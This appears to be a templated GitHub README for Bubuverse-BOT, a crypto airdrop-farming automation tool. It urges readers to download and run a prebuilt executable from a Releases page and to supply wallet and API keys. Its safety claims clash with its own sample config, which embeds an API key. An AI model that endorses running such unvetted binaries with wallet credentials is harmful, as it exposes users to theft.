About this project
Bubuverse-BOT is a professional automation tool built for serious Bubuverse farmers. It is designed to handle recurring tasks, manage daily routines, and optimize interactions with Bubuverse systems. The bot focuses on reliability, predictable behavior, and clear telemetry. It is meant for power users who want repeatable, auditable automation rather than ad hoc scripts.

The tool is modular. You can enable or disable features as needed. It supports scheduled tasks, data collection, and interaction with airdrops and daily events in Bubuverse. The system runs on a configurable stack and can operate in testnet or mainnet environments.

Why use Bubuverse-BOT
- Consistency: Automate daily routines so tasks run the same way every day.
- Reliability: Clear logs and predictable state transitions reduce surprises.
- Observability: Built-in telemetry helps you understand what happened and why.
- Safety: Strong defaults, explicit keys handling, and local execution context reduce risk.
- Extensibility: Modules can be swapped, upgraded, or extended without rewriting core logic.

Core concepts
- Bot: A standalone automation runner that executes a set of tasks on a schedule or on demand.
- Daily workflow: A sequence of tasks that starts at a defined time, processes data, and records results.
- Airdrop automation: Logic to participate in scheduled airdrops, claimable rewards, or token drops within the Bubuverse ecosystem.
- Testnet vs. mainnet: Separate configurations to keep testing isolated from production.
- Asset download: When a release asset is downloaded, the executable is run to boot the bot.

Quick start
- This project targets users who want to run a robust automation routine in Bubuverse. You should be comfortable with a command line, editing a config file, and monitoring logs.
- The quickest path to a working setup is to review the configuration, copy a sample config, and run the bot in testnet first. Once you confirm behavior, you can switch to mainnet with care.
- The Releases page contains the ready-to-run assets. From that page you can download the appropriate binary for your operating system and run it as instructed in the installation guide.

Download and installation notes
- The Releases page holds the binaries and installer packages for various platforms. From this page you can grab the correct asset, extract it if needed, and run the executable. The asset is the file you will execute to boot the bot.
- If you cannot access a binary for your platform, you can build from source using the provided instructions in the Development section.

Access the latest release
- The link at the top of this page points to the releases area where you can find the latest assets. For convenience, you can open it here: https://github.com/Zolvhub/Bubuverse-BOT/releases
- If you experience issues downloading from the page, check the Releases section for alternative assets or notes about platform compatibility.

Installation and setup
Prerequisites
- Operating system: Windows 10/11, macOS 10.15+, Linux (X64 with glibc 2.28+)
- Node.js or runtime compatible with the build (exact version depends on the asset you choose)
- Access to a Bubuverse testnet or mainnet account, with the necessary keys stored securely
- Network access to the Bubuverse endpoints used by the bot

Getting the release
- Visit the Releases page to download the asset for your platform.
- Save the file to a local directory you control.
- If the asset is a ZIP or TAR.GZ, extract it to a working directory.
- Ensure the executable has the proper permissions (for Linux/macOS, run chmod +x on the binary).

First run and basic configuration
- Create a local copy of the configuration file template included in the release.
- Populate required fields such as wallet address, API keys, network selection, and scheduling.
- Start the bot with the provided command. You should see the bot load the configuration and begin its first run cycle.

Configuration
- The configuration file is a simple JSON document. It contains keys for wallet, network, timing, logging, and feature toggles.
- Sample structure:
  {
    "wallet": "0xYOURWALLETADDRESS",
    "network": "testnet",
    "schedule": "02:00",
    "features": {
      "dailyTasks": true,
      "airdropAutomation": true
    },
    "apiKeys": {
      "bubuApi": "YOUR_API_KEY"
    },
    "logLevel": "info",
    "storagePath": "./data"
  }
- Key concepts in config:
  - wallet: the Bubuverse wallet addressed used by the bot.
  - network: testnet or mainnet. Start on testnet to verify behavior.
  - schedule: time in 24-hour format for daily runs.
  - features: enable or disable specific modules.
  - apiKeys: integration keys for external services.
  - storagePath: where to keep logs and state.

Running the bot
- Command line interface (CLI) basics:
  - Start: bubu-bot start --config ./config.json
  - Status: bubu-bot status
  - Stop: bubu-bot stop
  - Restart: bubu-bot restart
  - Logs: bubu-bot logs --since 1h
- If you installed from a release, substitute the binary name with the one in your build.
- The bot writes logs to a local directory. You can configure the log level and rotate logs to manage disk usage.

Daily workflow
- The daily workflow is a sequence of steps designed to run automatically at the specified time.
- Typical steps:
  - Initialize session: load configuration and credentials
  - Gather data: pull current network state, pricing, and relevant metrics
  - Execute tasks: place orders, interact with smart contracts, or mint assets
  - Record results: store outcomes in a local store and emit telemetry
  - Cleanup: close sessions, back up data, and prepare for the next run
- Scheduling is resilient. If a run fails due to a transient error, the bot retries with a backoff strategy.

Airdrop automation
- Airdrop automation is a core feature for some users. It is designed to participate in eligible drops, claim rewards, and log outcomes.
- Safe usage guidelines:
  - Run a dry test on the testnet before enabling on mainnet.
  - Validate each airdrop's eligibility criteria and deadlines.
  - Ensure you have sufficient funds for transaction fees if required by the drop.
- Workflow highlights:
  - Discover eligible airdrops from configured sources
  - Validate prerequisites
  - Submit participation requests
  - Poll for results and record outcomes
  - Handle failures gracefully with retry logic or fallbacks

Testnet workflows
- Testnet is the recommended starting point for new users.
- In testnet mode, you can simulate daily runs without risking real assets.
- Use testnet endpoints and testnet tokens if available.
- Monitor testnet logs to verify the bot behaves as expected before moving to mainnet.
- Once you are confident, switch the network configuration to mainnet and perform a careful validation run.

Logging, monitoring, and safety
- Logs are your first line of defense. They provide a trace of all actions the bot takes.
- You will find:
  - Initialization logs that show configuration loading
  - Task execution logs that describe each step
  - Telemetry data that captures outcomes and timing
- Proactive safety checks:
  - Access to sensitive keys is restricted to the bot process and is not logged
  - Secrets are loaded from environment variables or secure vaults, not embedded in the config
  - The bot validates state transitions before performing actions
  - If a critical issue occurs, the bot can pause operations to prevent damage
- Monitoring strategy:
  - Use log streams to watch for errors in real time
  - Set up alerting for failures or unexpected state changes
  - Periodically review historical data to spot trends

Advanced usage
- Modular design:
  - Add, remove, or replace modules to tailor the bot to your workflow
  - Each module has its own configuration and lifecycle
- Extensibility:
  - The bot exposes a simple interface for adding new tasks
  - You can write custom tasks in the supported language and plug them into the pipeline
- Performance tuning:
  - Adjust concurrency to balance speed and resource use
  - Tune retry backoffs to align with network reliability
  - Use local caching for frequently accessed data to reduce API calls
- Security hardening:
  - Rotate API keys on a regular cadence
  - Use least privilege for wallet actions
  - Keep dependencies up to date to reduce risk
